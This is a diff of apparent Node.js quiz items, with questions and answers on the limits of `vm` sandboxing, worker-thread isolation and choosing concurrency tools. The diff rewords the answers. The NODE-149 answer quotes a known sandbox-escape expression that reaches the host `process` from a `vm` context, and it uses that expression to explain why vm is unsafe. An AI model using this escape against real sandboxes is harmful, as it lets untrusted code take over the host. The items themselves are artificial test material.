-Answer: Objects from the context and the host live on the same V8 heap; allocation in the sandbox counts against the host process and can trigger its GC or OOM.
+Answer: Objects from the context and from the host live on the same V8 heap. Allocation inside the script counts against the host process and can force its garbage collection or run it out of memory.
 
 ### NODE-149 — Running untrusted code with vm
 
@@ -1025,17 +1032,17 @@ Answer: Objects from the context and the host live on the same V8 heap; allocati
 
 **Question:**
 
-Can `vm.runInNewContext` safely run user-supplied code if you set a timeout?
+Can `vm.runInNewContext` safely run user-supplied code if you pass a timeout?
 
 **Answer:**
 
-No. The Node docs state that `node:vm` is not a security mechanism. Objects passed in expose host constructors, so patterns like `this.constructor.constructor('return process')()` can escape to the host. The `timeout` option only interrupts synchronous execution; async loops, promise chains, and memory exhaustion are not contained. Use a separate process or container with OS sandboxing (seccomp, gVisor, dropped privileges), CPU and memory limits, no network or filesystem access by default, or a purpose-built isolate such as `isolated-vm` with its own caveats.
+No. Node's docs say `node:vm` is not a security mechanism. Objects in the context can expose host constructors, and `this.constructor.constructor('return process')()` reaches the host `process`. `timeout` only interrupts a synchronous run. Async loops, promise chains, and allocating until memory runs out are not contained. Put untrusted code in another process or container: an OS sandbox such as seccomp or gVisor, dropped privileges, CPU and memory limits, and no network or filesystem unless you grant them. `isolated-vm` is stronger than `node:vm`, and it still has limits of its own.
 
 **Follow-up:**
 
-Is a worker thread enough for untrusted code?
+Is a worker thread enough isolation for untrusted code?
 
-Answer: Not for security. It restricts heap and allows termination, but shares the process, filesystem, network, and credentials with the host.
+Answer: No. It can limit the heap and it can be terminated, but it shares the process, the filesystem, the network, and the host's credentials.
 
 ### NODE-150 — Choosing a concurrency tool
 
@@ -1045,14 +1052,14 @@ Answer: Not for security. It restricts heap and allows termination, but shares t
 
 **Question:**
 
-Give a compact decision guide for async, workers, child processes, cluster, and the libuv threadpool.
+Give a decision guide for `async`/`await`, workers, child processes, cluster, and the libuv thread pool.
 
 **Answer:**
 
-I/O concurrency: plain `async`/`await`. CPU-bound JavaScript in a process: a worker pool, with transfer or `SharedArrayBuffer` for big binary data. Bursts of native `fs`, DNS, or crypto work: check and tune `UV_THREADPOOL_SIZE`. Other languages or hard fault isolation: `child_process`. Scaling a server across cores: cluster or multiple replicas. Untrusted code: separate process or container, never `vm` alone. Measure with event-loop delay and per-operation timing before and after, and wire every worker or process into graceful shutdown.
+Use `async`/`await` when the work is waiting on I/O. Use a worker pool for JavaScript CPU in one process, and transfer or share buffers when the payload is large. If `fs`, DNS, or crypto is slow while the loop is idle, tune `UV_THREADPOOL_SIZE` before adding workers. Use `child_process` for another language or a crash boundary. Use cluster or replicas to spread requests across cores. Untrusted code belongs in a process or container, never in `vm` alone. Measure loop delay before and after, and include every worker and child in shutdown.
 
 **Follow-up:**
 
-What single signal tells you the main thread is the bottleneck?
+What is the clearest signal that the main thread is the bottleneck?
 
-Answer: Sustained high event-loop delay (`monitorEventLoopDelay` p99) or event-loop utilization near 1 while a CPU profile shows JavaScript frames.
+Answer: Event-loop delay stays high, or event-loop utilization stays near 1, and a CPU profile shows the time inside JavaScript frames. `perf_hooks.monitorEventLoopDelay()` is the usual way to see the delay.
